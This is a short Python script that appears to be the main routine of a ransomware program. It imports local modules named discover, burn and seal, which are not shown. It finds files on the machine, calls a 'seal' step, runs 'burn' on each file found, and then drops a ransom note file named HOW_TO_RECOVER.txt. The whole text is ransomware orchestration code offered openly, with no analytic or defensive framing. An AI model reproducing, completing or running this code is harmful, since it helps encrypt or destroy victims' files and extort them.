import discover
import burn
import seal

archivos=discover.encuentra_archivos()
print(archivos)
seal.main()

for item in archivos:
    burn.main(item)

with open("HOW_TO_RECOVER.txt",'w') as file:
    file.write("RANSOM-RANSOM")
